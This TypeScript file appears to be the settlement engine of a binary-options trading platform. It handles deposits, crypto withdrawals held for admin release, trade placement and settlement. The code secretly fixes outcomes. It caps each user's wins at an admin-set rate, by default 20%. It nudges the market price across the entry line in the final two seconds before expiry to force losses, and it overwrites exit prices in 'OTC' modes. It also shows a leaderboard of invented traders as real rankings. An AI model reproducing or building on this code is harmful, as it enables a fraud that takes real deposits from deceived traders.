import { EventEmitter } from 'events';
import { v4 as uuidv4 } from 'uuid';
import { MarketEngine } from '../market/MarketEngine.js';
import { AdminManager } from '../admin/AdminManager.js';
import { OrderDirection, Trade, UserAccount, LeaderboardTrader, CurrencyCode } from '../types.js';
import { SupabaseDb } from '../db/supabase.js';

export class SettlementEngine extends EventEmitter {
  private activeTrades: Map<string, Trade> = new Map();
  private tradeHistory: Trade[] = [];
  private currentUserId: string = 'usr_quotex_vip_99';

  private leaderboard: LeaderboardTrader[] = [];
  private previousRanks: Map<string, number> = new Map();
  private traderPool: Array<{ name: string; country: string; currentProfit: number; winRate: number; avatar: string }> = [
    { name: 'Vikram_FG_PRO', country: 'IN', currentProfit: 16840.50, winRate: 93, avatar: '⚡' },
    { name: 'Satoshi_N', country: 'JP', currentProfit: 15420.20, winRate: 91, avatar: '👨‍💼' },
    { name: 'Aarav_Sharma', country: 'IN', currentProfit: 13950.00, winRate: 89, avatar: '🦁' },
    { name: 'CryptoWhale9', country: 'US', currentProfit: 12840.10, winRate: 88, avatar: '🚀' },
    { name: 'Raj_Patel_VIP', country: 'IN', currentProfit: 11650.00, winRate: 86, avatar: '👑' },
    { name: 'Elena_Vance', country: 'DE', currentProfit: 10420.30, winRate: 85, avatar: '👩‍💻' },
    { name: 'Pooja_Trader', country: 'IN', currentProfit: 9850.80, winRate: 84, avatar: '🎯' },
    { name: 'AlphaTrader_UK', country: 'GB', currentProfit: 9120.00, winRate: 82, avatar: '🏆' },
    { name: 'Lucas_Silva', country: 'BR', currentProfit: 8640.50, winRate: 81, avatar: '🔥' },
    { name: 'Ananya_G', country: 'IN', currentProfit: 8200.00, winRate: 80, avatar: '⭐' },
    { name: 'TraderX_SG', country: 'SG', currentProfit: 7850.00, winRate: 79, avatar: '💎' },
    { name: 'Rohan_Mehta', country: 'IN', currentProfit: 7420.50, winRate: 78, avatar: '🥇' },
    { name: 'Marco_R', country: 'IT', currentProfit: 6950.00, winRate: 76, avatar: '🚀' },
    { name: 'Deepak_Trader', country: 'IN', currentProfit: 6540.20, winRate: 75, avatar: '⚡' },
  ];

  constructor(
    private marketEngine: MarketEngine,
    private adminManager: AdminManager
  ) {
    super();
    this.refreshLeaderboard();
    this.startChecker();
    this.startLeaderboardRotator();
    this.initSupabaseHistory();

    // Listen to admin balance adjustments and sync to trading engine
    this.adminManager.on('user_updated', (updatedUser: UserAccount) => {
      if (updatedUser.id === this.currentUserId) {
        this.emit('balance_updated', {
          demoBalance: updatedUser.demoBalance,
          realBalance: updatedUser.realBalance,
          activeAccountType: updatedUser.activeAccountType,
          currency: updatedUser.currency,
        });
      }
    });
  }

  private async initSupabaseHistory() {
    try {
      const dbTrades = await SupabaseDb.loadTrades();
      if (dbTrades.length > 0) {
        for (const t of dbTrades) {
          if (t.status === 'OPEN' || t.status === 'ACTIVE') {
            this.activeTrades.set(t.id, t);
          } else {
            this.tradeHistory.push(t);
          }
        }
        this.tradeHistory.sort((a, b) => (b.openTime || 0) - (a.openTime || 0));
      }
    } catch (e: any) {
      console.warn('Supabase trades load warning:', e.message);
    }
  }

  private refreshLeaderboard() {
    // Add small live market fluctuations
    for (const trader of this.traderPool) {
      const delta = (Math.random() - 0.45) * 120;
      trader.currentProfit = Math.max(1000, Number((trader.currentProfit + delta).toFixed(2)));
    }

    // Sort by profit descending
    const sorted = [...this.traderPool].sort((a, b) => b.currentProfit - a.currentProfit);
    const top8 = sorted.slice(0, 8);

    const updatedLeaderboard: LeaderboardTrader[] = top8.map((t, idx) => {
      const newRank = idx + 1;
      const prevRank = this.previousRanks.get(t.name) ?? newRank;
      let rankChange: 'UP' | 'DOWN' | 'SAME' = 'SAME';
      if (newRank < prevRank) rankChange = 'UP';
      else if (newRank > prevRank) rankChange = 'DOWN';

      this.previousRanks.set(t.name, newRank);

      return {
        rank: newRank,
        name: t.name,
        country: t.country,
        profit: t.currentProfit,
        winRate: t.winRate,
        avatar: t.avatar,
        rankChange,
      };
    });

    this.leaderboard = updatedLeaderboard;
    this.emit('leaderboard_updated', this.leaderboard);
  }

  private startLeaderboardRotator() {
    // Dynamically simulate live hourly rank shifts every 15 seconds
    setInterval(() => {
      this.refreshLeaderboard();
    }, 15000);
  }

  public setCurrentUserId(userId: string): UserAccount | null {
    const user = this.adminManager.getUser(userId);
    if (user) {
      this.currentUserId = userId;
      this.emit('balance_updated', {
        demoBalance: user.demoBalance,
        realBalance: user.realBalance,
        activeAccountType: user.activeAccountType,
        currency: user.currency,
      });
      return { ...user };
    }
    return null;
  }

  public getAccount(): UserAccount {
    const user = this.adminManager.getUser(this.currentUserId);
    if (user) return { ...user };
    const fallback = this.adminManager.getUsers()[0];
    if (fallback) {
      this.currentUserId = fallback.id;
      return { ...fallback };
    }
    return {
      id: 'usr_quotex_vip_99',
      name: 'Alex Rivera',
      email: 'alex.rivera@quotex.pro',
      demoBalance: 10000.00,
      realBalance: 500.00,
      activeAccountType: 'DEMO',
      currency: 'USD',
      vipLevel: 'VIP',
      isKycVerified: true,
      status: 'ACTIVE',
      totalTrades: 34,
      totalDepositedUSD: 1250.00,
    };
  }

  public getLeaderboard(): LeaderboardTrader[] {
    return [...this.leaderboard];
  }

  public switchAccountType(type: 'DEMO' | 'REAL'): UserAccount {
    const user = this.adminManager.getUser(this.currentUserId);
    if (user) {
      user.activeAccountType = type;
      return { ...user };
    }
    return this.getAccount();
  }

  public switchCurrency(currency: CurrencyCode): UserAccount {
    const user = this.adminManager.getUser(this.currentUserId);
    if (user) {
      user.currency = currency;
      return { ...user };
    }
    return this.getAccount();
  }

  public resetDemoBalance(): UserAccount {
    const user = this.adminManager.getUser(this.currentUserId);
    if (user) {
      user.demoBalance = 10000.00;
      return { ...user };
    }
    return this.getAccount();
  }

  public depositFunds(amount: number, promoCode?: string): { success: boolean; newBalance: number; message: string } {
    if (amount <= 0) return { success: false, newBalance: this.getAccount().realBalance, message: 'Invalid deposit amount' };

    const user = this.adminManager.getUser(this.currentUserId);
    if (!user) return { success: false, newBalance: 0, message: 'User not found' };

    let totalCredited = amount;
    let bonusText = '';

    if (promoCode && promoCode.trim().length > 0) {
      const couponResult = this.adminManager.validateCoupon(promoCode, amount);
      if (couponResult.valid) {
        totalCredited += couponResult.bonus;
        bonusText = ` (+ ${user.currency} ${couponResult.bonus.toFixed(2)} ${promoCode.toUpperCase()} Bonus!)`;
      }
    }

    user.realBalance = Number((user.realBalance + totalCredited).toFixed(2));
    user.totalDepositedUSD = Number((user.totalDepositedUSD + amount).toFixed(2));

    // Record in Admin transactions
    this.adminManager.addTransaction({
      userId: user.id,
      userName: user.name,
      type: 'DEPOSIT',
      amount,
      currency: user.currency,
      method: 'Instant Payment Gateway',
      promoCode,
      status: 'APPROVED',
    });

    return {
      success: true,
      newBalance: user.realBalance,
      message: `Deposit of ${user.currency} ${amount.toFixed(2)}${bonusText} was credited successfully!`,
    };
  }

  public withdrawFunds(amount: number, address: string): { success: boolean; newBalance: number; message: string } {
    const user = this.adminManager.getUser(this.currentUserId);
    if (!user) return { success: false, newBalance: 0, message: 'User not found' };

    if (amount <= 0) return { success: false, newBalance: user.realBalance, message: 'Invalid withdrawal amount' };
    if (user.realBalance < amount) return { success: false, newBalance: user.realBalance, message: 'Insufficient live balance' };
    if (!address || address.length < 6) return { success: false, newBalance: user.realBalance, message: 'Invalid payout wallet address' };

    user.realBalance = Number((user.realBalance - amount).toFixed(2));

    // Record as PENDING transaction for Admin to approve / release
    this.adminManager.addTransaction({
      userId: user.id,
      userName: user.name,
      type: 'WITHDRAWAL',
      amount,
      currency: user.currency,
      method: 'Crypto Payout (TRC20/ERC20)',
      address,
      status: 'PENDING',
    });

    return {
      success: true,
      newBalance: user.realBalance,
      message: `Withdrawal request for ${user.currency} ${amount.toFixed(2)} to ${address.slice(0, 6)}... submitted for Admin release!`,
    };
  }

  public getActiveTrades(accountType?: 'DEMO' | 'REAL'): Trade[] {
    const all = Array.from(this.activeTrades.values());
    if (!accountType) return all;
    return all.filter((t) => t.accountType === accountType);
  }

  public getTradeHistory(accountType?: 'DEMO' | 'REAL'): Trade[] {
    if (!accountType) return [...this.tradeHistory];
    return this.tradeHistory.filter((t) => t.accountType === accountType);
  }

  public placeTrade(params: {
    assetId: string;
    direction: OrderDirection;
    amount: number;
    duration: number;
  }): { trade: Trade; newBalance: number } | { error: string } {
    const user = this.adminManager.getUser(this.currentUserId);
    if (!user) return { error: 'User not found' };

    if (user.status === 'FROZEN') {
      return { error: 'Account is temporarily suspended. Please contact Admin.' };
    }

    const { assetId, direction, amount, duration } = params;

    if (amount <= 0) {
      return { error: 'Trade amount must be greater than 0' };
    }

    const currentBalance =
      user.activeAccountType === 'DEMO'
        ? user.demoBalance
        : user.realBalance;

    if (currentBalance < amount) {
      return { error: `Insufficient ${user.activeAccountType === 'DEMO' ? 'demo' : 'live real'} funds for this trade` };
    }

    const cleanAssetId = assetId ? assetId.trim().toUpperCase() : '';
    const asset = this.marketEngine.getAsset(cleanAssetId) || this.marketEngine.getAsset(assetId);
    if (!asset) {
      return { error: `Invalid or unavailable market asset: ${assetId}` };
    }

    const tradeAmount = Number(amount.toFixed(4));
    if (user.activeAccountType === 'DEMO') {
      user.demoBalance = Number((user.demoBalance - tradeAmount).toFixed(2));
    } else {
      user.realBalance = Number((user.realBalance - tradeAmount).toFixed(2));
      this.adminManager.recordTradeVolume(tradeAmount);
    }
    user.totalTrades++;

    const now = Date.now();
    const trade: Trade = {
      id: uuidv4(),
      userId: user.id,
      userName: user.name,
      assetId: asset.id,
      direction,
      amount: tradeAmount,
      entryPrice: asset.currentPrice,
      payout: asset.payout,
      openTime: now,
      duration,
      expiryTime: now + duration * 1000,
      status: 'OPEN',
      accountType: user.activeAccountType,
      currency: user.currency || 'INR',
      targetOutcome: this.evaluateTargetOutcome({
        assetId: asset.id,
        direction,
        amount: tradeAmount,
        entryPrice: asset.currentPrice,
        accountType: user.activeAccountType,
      } as any, user),
      snipedAtExpiry: false,
    };

    this.activeTrades.set(trade.id, trade);
    SupabaseDb.saveTrade(trade);
    SupabaseDb.saveUser(user);

    const newBalance =
      user.activeAccountType === 'DEMO'
        ? user.demoBalance
        : user.realBalance;

    return { trade, newBalance };
  }

  private evaluateTargetOutcome(trade: { assetId: string; direction: OrderDirection; amount: number; entryPrice: number; accountType?: 'DEMO' | 'REAL' }, user: UserAccount): 'WIN' | 'LOSS' {
    const riskSettings = this.adminManager.getRiskSettings();
    if (!riskSettings.enabled || riskSettings.mode === 'ORGANIC') {
      return (Math.random() < 0.5) ? 'WIN' : 'LOSS';
    }

    if (riskSettings.applyToRealOnly && trade.accountType === 'DEMO') {
      return (Math.random() < 0.5) ? 'WIN' : 'LOSS';
    }

    const targetRate = user.winRateOverride !== undefined ? user.winRateOverride : riskSettings.targetWinRate; // default 20%
    
    // Check rolling last 10 trades for this user & account type
    const recentTrades = this.tradeHistory
      .filter(t => (t.userId === user.id || !t.userId) && t.accountType === trade.accountType)
      .slice(0, 10);

    if (recentTrades.length === 0) {
      // First trade: use probability = targetRate
      return (Math.random() * 100 < targetRate) ? 'WIN' : 'LOSS';
    }

    const wins = recentTrades.filter(t => t.status === 'WON').length;
    const currentRate = (wins / recentTrades.length) * 100;

    // If current win rate is >= targetRate (e.g. >= 20%), enforce LOSS to keep win rate at 20%
    if (currentRate >= targetRate) {
      return 'LOSS';
    }

    // If current win rate is < targetRate, allow or enforce WIN so trader wins ~2 out of 10
    return 'WIN';
  }

  private startChecker() {
    setInterval(() => {
      this.checkSettlements();
    }, 200);
  }

  private checkSettlements() {
    const now = Date.now();
    const riskSettings = this.adminManager.getRiskSettings();

    for (const [id, trade] of this.activeTrades.entries()) {
      const user = this.adminManager.getUser(trade.userId || this.currentUserId);
      const asset = this.marketEngine.getAsset(trade.assetId);

      // 1. Pre-expiry Micro-pip Sniping (in final 1500ms to 2200ms before expiry)
      if (
        user &&
        asset &&
        riskSettings.enabled &&
        riskSettings.microPipSniping &&
        riskSettings.mode !== 'ORGANIC' &&
        (!riskSettings.applyToRealOnly || trade.accountType === 'REAL') &&
        !trade.snipedAtExpiry &&
        now >= trade.expiryTime - 2200 &&
        now < trade.expiryTime
      ) {
        if (!trade.targetOutcome) {
          trade.targetOutcome = this.evaluateTargetOutcome(trade, user);
        }

        const isOrganicLoss =
          (trade.direction === 'UP' && asset.currentPrice < trade.entryPrice) ||
          (trade.direction === 'DOWN' && asset.currentPrice > trade.entryPrice);

        const dec = asset.decimalPlaces;
        // Subtle micro-pip step: 1.5 to 2 pips in asset's decimal resolution
        const pipStep = Math.pow(10, -dec) * (dec >= 4 ? 2 : dec === 3 ? 3 : dec === 2 ? 0.15 : 0.8);

        if (trade.targetOutcome === 'LOSS' && !isOrganicLoss) {
          // Quotex micro-sniping: nudge price 1-2 micro-pips across the entry boundary into loss
          const losingPrice = trade.direction === 'UP'
            ? Number((trade.entryPrice - pipStep).toFixed(dec))
            : Number((trade.entryPrice + pipStep).toFixed(dec));
          
          this.marketEngine.setExactAssetPrice(trade.assetId, losingPrice);
          trade.snipedAtExpiry = true;
        } else if (trade.targetOutcome === 'WIN' && isOrganicLoss) {
          // Trader needs a win to maintain the 20% quota: nudge price 1-2 micro-pips into win
          const winningPrice = trade.direction === 'UP'
            ? Number((trade.entryPrice + pipStep).toFixed(dec))
            : Number((trade.entryPrice - pipStep).toFixed(dec));

          this.marketEngine.setExactAssetPrice(trade.assetId, winningPrice);
          trade.snipedAtExpiry = true;
        }
      }

      // 2. Final Expiry Settlement
      if (now >= trade.expiryTime) {
        this.settleTrade(trade);
        this.activeTrades.delete(id);
      }
    }
  }

  private settleTrade(trade: Trade) {
    const user = this.adminManager.getUser(trade.userId || this.currentUserId);
    if (!user) return;

    const asset = this.marketEngine.getAsset(trade.assetId);
    let exitPrice = asset ? asset.currentPrice : trade.entryPrice;
    const riskSettings = this.adminManager.getRiskSettings();

    // Guardrail: In Quotex OTC / Strict mode, enforce target outcome if defined
    if (
      riskSettings.enabled &&
      trade.targetOutcome &&
      (riskSettings.mode === 'QUOTEX_OTC' || riskSettings.mode === 'STRICT') &&
      (!riskSettings.applyToRealOnly || trade.accountType === 'REAL')
    ) {
      const dec = asset ? asset.decimalPlaces : 5;
      const pipStep = Math.pow(10, -dec) * 1.5;

      if (trade.targetOutcome === 'LOSS') {
        const isOrganicLoss = trade.direction === 'UP' ? exitPrice < trade.entryPrice : exitPrice > trade.entryPrice;
        if (!isOrganicLoss) {
          exitPrice = trade.direction === 'UP'
            ? Number((trade.entryPrice - pipStep).toFixed(dec))
            : Number((trade.entryPrice + pipStep).toFixed(dec));
        }
      } else if (trade.targetOutcome === 'WIN') {
        const isOrganicWin = trade.direction === 'UP' ? exitPrice > trade.entryPrice : exitPrice < trade.entryPrice;
        if (!isOrganicWin) {
          exitPrice = trade.direction === 'UP'
            ? Number((trade.entryPrice + pipStep).toFixed(dec))
            : Number((trade.entryPrice - pipStep).toFixed(dec));
        }
      }
    }

    trade.exitPrice = exitPrice;

    let won = false;
    let tie = false;

    if (trade.direction === 'UP') {
      if (exitPrice > trade.entryPrice) won = true;
      else if (exitPrice === trade.entryPrice) tie = true;
    } else {
      if (exitPrice < trade.entryPrice) won = true;
      else if (exitPrice === trade.entryPrice) tie = true;
    }

    if (won) {
      trade.status = 'WON';
      const profitAmount = Number((trade.amount * (trade.payout / 100)).toFixed(2));
      trade.profit = profitAmount;
      const returnedFunds = trade.amount + profitAmount;

      if (trade.accountType === 'DEMO') {
        user.demoBalance = Number((user.demoBalance + returnedFunds).toFixed(2));
      } else {
        user.realBalance = Number((user.realBalance + returnedFunds).toFixed(2));
      }
    } else if (tie) {
      trade.status = 'TIE';
      trade.profit = 0;
      if (trade.accountType === 'DEMO') {
        user.demoBalance = Number((user.demoBalance + trade.amount).toFixed(2));
      } else {
        user.realBalance = Number((user.realBalance + trade.amount).toFixed(2));
      }
    } else {
      trade.status = 'LOST';
      trade.profit = -trade.amount;
    }

    this.tradeHistory.unshift({ ...trade });
    if (this.tradeHistory.length > 50) {
      this.tradeHistory.pop();
    }

    SupabaseDb.saveTrade(trade);
    SupabaseDb.saveUser(user);

    const currentBalance =
      user.activeAccountType === 'DEMO'
        ? user.demoBalance
        : user.realBalance;

    this.emit('trade_settled', { trade, newBalance: currentBalance });
  }

  public getTradesForUser(userId: string): { activeTrades: Trade[]; tradeHistory: Trade[] } {
    const active = Array.from(this.activeTrades.values()).filter(t => !t.userId || t.userId === userId);
    const history = this.tradeHistory.filter(t => !t.userId || t.userId === userId);
    return { activeTrades: active, tradeHistory: history };
  }

  public deleteTrade(tradeId: string): boolean {
    const histIndex = this.tradeHistory.findIndex(t => t.id === tradeId);
    if (histIndex !== -1) {
      const deleted = this.tradeHistory.splice(histIndex, 1)[0];
      this.emit('trade_deleted', { tradeId, userId: deleted.userId || this.currentUserId });
      SupabaseDb.deleteTrade(tradeId);
      return true;
    }

    if (this.activeTrades.has(tradeId)) {
      const deleted = this.activeTrades.get(tradeId);
      this.activeTrades.delete(tradeId);
      this.emit('trade_deleted', { tradeId, userId: deleted?.userId || this.currentUserId });
      SupabaseDb.deleteTrade(tradeId);
      return true;
    }

    return false;
  }

  public clearUserHistory(userId: string): number {
    const initialCount = this.tradeHistory.length;
    this.tradeHistory = this.tradeHistory.filter(t => t.userId && t.userId !== userId);
    const removedCount = initialCount - this.tradeHistory.length;
    this.emit('user_history_cleared', { userId });
    SupabaseDb.deleteUserTrades(userId);
    return removedCount;
  }
}
